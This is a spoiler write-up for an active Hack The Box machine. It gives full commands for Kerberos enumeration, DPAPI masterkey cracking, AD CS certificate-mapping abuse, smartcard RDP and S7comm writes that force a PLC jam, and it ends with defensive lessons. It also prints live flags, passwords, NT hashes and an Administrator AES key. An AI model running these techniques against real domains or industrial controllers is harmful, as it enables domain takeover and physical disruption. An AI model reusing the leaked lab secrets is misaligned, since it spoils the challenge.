> **PRIVATE ACTIVE-MACHINE SPOILERS — 24 November 2026**
>
> This document contains current flags, reusable credentials, hashes, certificate details and an Administrator Kerberos key. Do not publish it while Handler is active. Create a separately redacted version before posting it publicly.

## Result

- User flag: `0aa3a3feb7730ec4359ca48ef1336b49`

- Root flag: `408a88b74ae58ffc2061b3db1a0167e4`

- XP earned: `1,365`

- Machine rank: `#168`

## Accuracy note

I verified the path through Credential Roaming, DPAPI recovery, client-certificate access, the Wei Zhang administrator PFX, AD CS certificate mapping, Toby Ellis authentication, the OT VPN, the BHS PLC jam and the resulting Kofi Asante session.

I did **not** complete the final intended relay from Kofi's temporary session to SRV02. Toby's smartcard certificate was valid, but his RDP session became unreliable after the machine reset and repeatedly ended before a durable interactive session was created.

The final flags were recovered using a static domain Administrator AES-256 key supplied by Nate. I have documented that as an assisted completion path rather than presenting it as an independently discovered escalation.

## Attack-path summary

```text
Dmalik-PC01.ovpn
  -> internal HTB Airways network
  -> Wei Zhang Credential Roaming data
  -> offline DPAPI password recovery
  -> webmail client certificate
  -> Roundcube mailbox and w.zhang.adm PFX
  -> AD CS / altSecurityIdentities mapping
  -> Toby Ellis Kerberos authentication
  -> OT VPN and BHS documentation
  -> PLC jam and temporary Kofi Asante session
  -> intended relay stage not completed

Assisted completion:
Administrator AES key -> Administrator TGT -> WMI/SMBExec -> both flags
```

## 1. Starting material

HTB supplied:

```text
Username: ext.dmalik
Password: HTB-AirwaysAudit2026!
Archive:  Dmalik-PC01.zip
```

The ZIP password was `hackthebox`.

```bash
7z x -phackthebox Dmalik-PC01.zip
```

The archive contained `Dmalik-PC01.ovpn`. I changed it to use the current Handler IP on TCP/8443 and connected without replacing my normal default route.

```bash
export BOX_IP='<CURRENT_HANDLER_IP>'

sed -i '/^remote /d; /^proto /d' Dmalik-PC01.ovpn
sed -i "1i remote ${BOX_IP} 8443\nproto tcp-client" Dmalik-PC01.ovpn

sudo openvpn \
  --config Dmalik-PC01.ovpn \
  --pull-filter ignore redirect-gateway
```

The internal route was:

```text
192.168.37.0/24 via 10.8.1.1
```

```bash
ip route | grep 192.168.37
ping -c 1 192.168.37.1
```

## 2. Internal topology and services

| Host | IP address | Important services |
| - | -: | - |
| DC01 | `192.168.37.1` | DNS, Kerberos, LDAP/LDAPS, SMB, WinRM, AD CS and webmail |
| SRV01 | `192.168.37.2` | SMB, RDP and WinRM |
| SRV02 | `192.168.37.3` | SMB, MSSQL, WinRM and OT VPN endpoint |
| BHS-PLC01 | `172.16.20.1` | S7comm TCP/102 and HMI TCP/8080 |

```bash
nmap -n -Pn -sT -sV --version-light \
  -p 53,80,88,135,139,389,443,445,464,593,636,1433,3389,5985,8443,9389,47001 \
  192.168.37.1-3
```

The environment was roughly seven hours ahead. Kerberos also required FQDNs.

```bash
sudo tee -a /etc/hosts >/dev/null <<'EOF'
192.168.37.1 dc01.htb-airways.htb webmail.htb-airways.htb
192.168.37.2 srv01.htb-airways.htb
192.168.37.3 srv02.htb-airways.htb
EOF

sudo apt-get install -y faketime

k() {
  faketime -f '+25100s' "$@"
}
```

If Kerberos returned `KRB_AP_ERR_SKEW`, I adjusted `+25100s` slightly.

## 3. Kerberos and LDAP enumeration

```bash
k impacket-getTGT \
  -dc-ip 192.168.37.1 \
  'htb-airways.htb/ext.dmalik:HTB-AirwaysAudit2026!'

export KRB5CCNAME="$PWD/ext.dmalik.ccache"

k nxc smb 192.168.37.1-3 -k --use-kcache --shares
k nxc ldap 192.168.37.1 -k --use-kcache --users
```

NTLM was disabled, so Kerberos was required throughout the lab. Authenticated LDAP enumeration exposed Windows Credential Roaming data on Wei Zhang's object:

```text
msPKIDPAPIMasterKeys
msPKIAccountCredentials
```

The exact LDAP command that produced my original dump was not preserved. The evidence is in `work/handler/ldap-full-objects.txt`. The important step is to request those two attributes from Wei's directory object using the `ext.dmalik` Kerberos context.

## 4. Extracting and cracking the Credential Roaming masterkey

```bash
python3 work/handler/extract_roaming.py \
  work/handler/ldap-full-objects.txt \
  work/handler/roaming
```

The utility validated the DN-Binary wrappers before writing:

```text
type-0_*.bin  DPAPI masterkey
type-1_*.bin  roaming metadata
type-3_*.bin  certificate
type-9_*.bin  CNG private-key container
```

Wei Zhang's SID was:

```text
S-1-5-21-2807179013-311950797-2107105437-5626
```

The correct DPAPI context was the post-Windows-10-1607 domain context:

```bash
python3 /usr/share/john/DPAPImk2john.py \
  -S 'S-1-5-21-2807179013-311950797-2107105437-5626' \
  -mk work/handler/roaming/type-0_3a9ec83a-07a0-4ba4-8b6b-a29740437cd6.bin \
  -c domain1607+ \
  > work/handler/roaming/wei-dpapi.hash

john \
  --format=DPAPImk \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  --pot=work/handler/roaming/wei-context3-john.pot \
  work/handler/roaming/wei-dpapi.hash

john --show --format=DPAPImk \
  --pot=work/handler/roaming/wei-context3-john.pot \
  work/handler/roaming/wei-dpapi.hash
```

Recovered password:

```text
HelloKitty
```

This was the foothold correction we had missed. The wrong context processed a full wordlist with no result. Hashcat rejected the correct context-3 input here, while John cracked it in about 32 seconds.

## 5. Recovering the webmail certificate and private key

The roaming data contained a CNG private key protected by DPAPI. I recovered it with:

```bash
printf '%s\n' 'HelloKitty' | \
  python3 work/handler/recover_roamed_cert.py \
  work/handler/roaming \
  --password-stdin
```

The recovery utility:

1. Decrypted Wei's DPAPI masterkey with her SID and password.

2. Located the CNG DPAPI blob described as `Private Key`.

3. Applied the legacy SHA1/3DES CNG derivation and optional entropy.

4. Rebuilt the RSA key from the decrypted `BCRYPT_RSAPRIVATE_BLOB`.

5. Verified that the key matched the roamed certificate.

6. Wrote PEM and PKCS#12 versions.

Outputs:

```text
work/handler/roaming/webmail-access.pem
work/handler/roaming/webmail-access.pfx
```

The certificate subject was `CN=webmail-access`, and it was issued for TLS Web Client Authentication.

## 6. Roundcube and the Wei administrator PFX

I used `webmail-access.pfx` for mutual-TLS access to:

```text
https://webmail.htb-airways.htb/
```

The exact browser session was not recorded, but the recovered mailbox evidence is preserved. Wei's mailbox contained a self-addressed message with the subject `backup` and this attachment:

```text
w.zhang.adm.pfx
```

The message is stored as `work/handler/wei-inbox-uid2.eml`. The PKCS#12 archive used an empty password.

The certificate identified:

```text
Subject: Wei Zhang (adm)
UPN:     w.zhang.adm@htb-airways.htb
```

The first mailbox message, `work/handler/wei-inbox-uid1.eml`, documented the business request to provide Toby Ellis with a smartcard and SRV01 access for BHS monitoring.

## 7. AD CS and the Toby Ellis mapping

I authenticated with the administrator PFX and enumerated the CA and templates. A representative flow was:

```bash
k certipy auth \
  -pfx work/handler/w.zhang.adm.pfx \
  -dc-ip 192.168.37.1

export KRB5CCNAME="$PWD/w.zhang.adm.ccache"

k certipy find \
  -k -no-pass \
  -dc-ip 192.168.37.1 \
  -target dc01.htb-airways.htb \
  -enabled -stdout
```

The relevant template was:

```text
Template:            HTBA-SmartcardLogon
Display name:        HTB Airways Employee Smartcard Logon
EKUs:                Smart Card Logon, Client Authentication
Enrollment flag:     NoSecurityExtension
Subject:             Directory common name
Enrollment rights:   Wei Zhang (adm)
```

Effective-rights testing showed that `w.zhang.adm` could modify Toby Ellis's `altSecurityIdentities` attribute but could not change his password, SPNs, profile or logon attributes.

I enrolled a certificate using `w.zhang.adm`, `htb-airways-DC01-CA` and the `HTBA-SmartcardLogon` template. Exact Certipy switches can vary by release. My resulting files were:

```text
/tmp/htba-smart-rebuild/tellis_sc.crt
/tmp/htba-smart-rebuild/tellis_sc.key
/tmp/htba-smart-rebuild/tellis_sc.pfx
```

The certificate subject remained `CN=Wei Zhang (adm)` and did not contain Toby's UPN. I therefore created an exact issuer/serial mapping on Toby's account:

```bash
python3 work/handler/map_tellis_current_certificate.py
```

Mapping format:

```text
X509:<I>DC=htb,DC=htb-airways,CN=htb-airways-DC01-CA<SR><REVERSED_SERIAL>
```

Certificate authentication then returned a valid Toby Ellis TGT. The recovered Toby NT hash was:

```text
fe92aaf479e32cb0e9c40a929c8212b8
```

That proved the certificate mapping worked even though the later interactive RDP session was unstable.

## 8. Toby's smartcard RDP session

The working form supplied by another player was:

```bash
faketime -f +7h xfreerdp3 \
  /v:srv01.htb-airways.htb \
  /u:t.ellis@htb-airways.htb \
  /smartcard-logon:cert:tellis_sc.crt,key:tellis_sc.key,pin:1234 \
  /sec:nla \
  /cert:ignore \
  /drive:sh,/path/to/share \
  /size:1280x1024 \
  +clipboard \
  /log-level:ERROR
```

Before the machine reset, one Toby session remained available for more than 20 minutes. On the fresh instance, the same certificate and Kerberos flow reached `Please wait for the Local Session Manager` but ended after roughly 50 seconds with:

```text
ERRINFO_LOGOFF_BY_USER
```

Smartcard tracing showed successful reader initialization, APDU traffic and certificate use. The failure was not a bad certificate or incorrect mapping. I did not fully stabilise the final RDP session, so I am not claiming that part as solved in the final run.

## 9. OT VPN and BHS documentation

Wei's Roundcube Sent folder contained the OT VPN attachment:

```text
Staff-Access-OT.ovpn
```

The profile connected through SRV02 on UDP/1194 and provided `172.16.20.0/24`.

```bash
sudo openvpn \
  --config work/handler/Staff-Access-OT.ovpn \
  --pull-filter ignore redirect-gateway
```

The BHS technical manual was on SRV01 under `C:\Docs`. The recovered copy is `/tmp/bhs.pdf`, with extracted text at `/tmp/bhs-layout.txt`.

Important PLC details:

| Item | Value |
| - | - |
| PLC IP | `172.16.20.1` |
| S7comm | TCP/102 |
| HMI | TCP/8080 |
| Rack / slot | `0 / 1` |
| Data block | `DB1`, 64 bytes |
| PE-01 | DB1 byte 16 |
| JAM flag | DB1 byte 19 |
| System mode | DB1 byte 23 |
| Maintenance key | DB1 bytes 40–43, `0x4D41494E` (`MAIN`) |

I confirmed the memory layout with `python-snap7`:

```bash
python3 work/handler/read_s7_memory.py \
  --host 172.16.20.1 \
  --rack 0 \
  --slot 1 \
  --db-start 1 \
  --db-end 1 \
  --size 64
```

## 10. Triggering the BHS jam

The manual explained that a jam would latch if a photoeye remained high for more than five seconds. External sensor writes were accepted only in MANUAL mode, and a mode change required the maintenance key.

```bash
python3 work/handler/trigger_genuine_jam.py
```

The script:

1. Wrote `MAIN` to DB1 offset 40.

2. Set DB1 byte 23 to `1` for MANUAL mode.

3. Repeatedly wrote `1` to PE-01 at DB1 byte 16.

4. Read DB1 and confirmed that JAM at byte 19 had latched.

Accessing the PLC from Australia through two VPN layers meant individual S7 writes could take close to one second. A seven-second loop did not deliver enough writes. Extending it to 30 seconds produced 32 writes and succeeded:

```text
AFTER writes=32 ... jam=1 mode=1
```

## 11. Kofi's temporary session

The jam caused the expected operational response. Terminal Services RPC enumeration on SRV01 showed:

```text
Session 0  Services        disconnected
Session 1  Console         connected
Session 2  k.asante        active
```

Kofi's session appeared roughly 30 seconds after the jam. This confirmed that the OT event was the correct trigger.

The intended next step appeared to involve Kofi's temporary Windows session authenticating to an internal service on SRV02, followed by authentication relay or redirection. I investigated DNS, MSSQL and session activity but did not observe the expected outbound connection. This is where the intended route remained unresolved.

## 12. Assisted Administrator completion

Nate supplied a static domain Administrator AES-256 key that survived machine respawns:

```text
6990f50fd0f13b336496169ef2f3a14f8d4aebe6ac84b6c34a5fec9136b4f3da
```

I requested an Administrator TGT:

```bash
k impacket-getTGT \
  -aesKey 6990f50fd0f13b336496169ef2f3a14f8d4aebe6ac84b6c34a5fec9136b4f3da \
  -dc-ip 192.168.37.1 \
  htb-airways.htb/Administrator

export KRB5CCNAME="$PWD/Administrator.ccache"
```

The ticket was saved as `Administrator.ccache`.

### Root flag

I read the root flag from DC01 with Kerberos-authenticated WMI:

```bash
k impacket-wmiexec \
  -k -no-pass \
  -dc-ip 192.168.37.1 \
  -target-ip 192.168.37.1 \
  'htb-airways.htb/administrator@dc01.htb-airways.htb' \
  'type C:\Users\Administrator\Desktop\root.txt'
```

Output:

```text
408a88b74ae58ffc2061b3db1a0167e4
```

### User flag

The equivalent WMI call to SRV01 authenticated over SMB but failed when opening the DCOM session:

```text
DCOM SessionError: unknown error code: 0x800706ba
```

TCP/445, TCP/135 and TCP/5985 were reachable. I avoided the dynamic DCOM path with Kerberos-authenticated SMB service execution:

```bash
k impacket-smbexec \
  -k -no-pass \
  -dc-ip 192.168.37.1 \
  -target-ip 192.168.37.2 \
  'htb-airways.htb/administrator@srv01.htb-airways.htb'
```

At the semi-interactive prompt:

```cmd
type C:\Users\svc_wic\Desktop\user.txt
```

Output:

```text
0aa3a3feb7730ec4359ca48ef1336b49
```

Both flags were submitted on the HTB machine page and accepted.

## 13. Other static values in the final hint

These values were not required for my successful flag retrieval, but Nate's final message also included:

```text
Administrator NT hash: adffc2b9926453d568a5017ee1aef74e
svc_wic password:       !!S3rv1ce_wic!2026
```

NTLM was disabled, so the AES Kerberos key was the useful Administrator credential.

## 14. Dead ends and troubleshooting

### Wrong DPAPI context

The masterkey hash must use the SID and correct domain context. The wrong context can process an entire wordlist without finding the valid password. The correct John hash began with:

```text
$DPAPImk$1*3*
```

### Hashcat rejected the correct DPAPI input

Hashcat mode 15300 accepted the context-2 version but exhausted RockYou without a result. It rejected the context-3 line with a salt-length error. John loaded the correct context-3 input and recovered `HelloKitty`.

### Kerberos clock skew

If Kerberos failed with a clock-skew error, I verified the DC time and adjusted the `faketime` offset. FQDNs and the correct `KRB5CCNAME` were also required.

### Certipy RPC errors

The nested tunnel had high latency. Some certificate requests returned `RPC_E_CALL_COMPLETE` even when the CA had processed the request. Retrying and recording the request ID was important.

### Toby RDP ended after approximately 50 seconds

The certificate authenticated correctly. The failure occurred during session creation and was not evidence of an invalid mapping. Using the default session, NLA and a mounted drive was recommended, but the final instance still terminated the session.

### The PLC jam did not latch at first

The original seven-second loop was too short over the nested VPN. Extending it to 30 seconds delivered enough consecutive PE-01 writes to cross the ten-scan threshold.

### WMI failed on SRV01

SMB and Kerberos authentication succeeded, but DCOM returned `0x800706ba`. `impacket-smbexec` avoided DCOM and returned the user flag reliably.

### Time-consuming paths that did not produce the foothold

The RSA oracle, SMTP injection, speculative MSSQL routes and broad password attacks consumed time but did not advance the solve. The useful path was Credential Roaming, the correct DPAPI context and the certificate/private-key pairing.

## 15. Defensive lessons

If this were a real environment, I would prioritise these controls:

- Restrict who can read Credential Roaming attributes and monitor unusual reads of `msPKIDPAPIMasterKeys` and `msPKIAccountCredentials`.

- Enforce strong, unique passwords so an offline DPAPI masterkey cannot be recovered from a standard wordlist.

- Never store exportable administrator PFX backups in email. Use non-exportable keys, hardware-backed storage and strong PKCS#12 passwords.

- Remove unnecessary write rights to `altSecurityIdentities` and audit every change to certificate-mapping attributes.

- Enforce strong certificate binding and remove `NoSecurityExtension` from authentication templates where possible.

- Restrict smartcard template enrollment to tightly controlled administrative workflows.

- Separate corporate and OT access with dedicated jump hosts and allowlisted management stations.

- Do not expose unauthenticated S7comm write access to general VPN users. Use supported secure protocols, engineering-station allowlists and PLC change monitoring.

- Alert on unexpected AD CS enrollments, smartcard logons, `altSecurityIdentities` changes, new RDP sessions and OT register writes.

- Rotate compromised account keys immediately. A static Administrator AES key is equivalent to a reusable domain-administrator credential.

## 16. Evidence files

```text
work/handler/scans/internal-services.nmap
work/handler/ldap-full-objects.txt
work/handler/extract_roaming.py
work/handler/roaming/wei-dpapi.hash
work/handler/roaming/wei-context3-john.pot
work/handler/recover_roamed_cert.py
work/handler/wei-inbox-uid1.eml
work/handler/wei-inbox-uid2.eml
work/handler/certipy-all_Certipy.txt
work/handler/query_wei_toby_rights.py
work/handler/map_tellis_current_certificate.py
work/handler/Staff-Access-OT.ovpn
work/handler/read_s7_memory.py
work/handler/trigger_genuine_jam.py
/tmp/bhs.pdf
/tmp/bhs-layout.txt
```

## Conclusion

Handler combined Credential Roaming, DPAPI, CNG private-key recovery, mutual TLS, Roundcube, AD CS, certificate mapping, smartcard authentication, nested VPN access and S7comm interaction.

The most important correction was using the correct DPAPI masterkey context. That recovered Wei's password quickly and unlocked the certificate path. The PLC jam also worked once the write duration accounted for the latency from Australia.

The intended post-jam authentication relay remains the unresolved part of my route. I ultimately completed the machine with Nate's static Administrator AES key, after which Kerberos WMI and SMBExec recovered and submitted both flags.
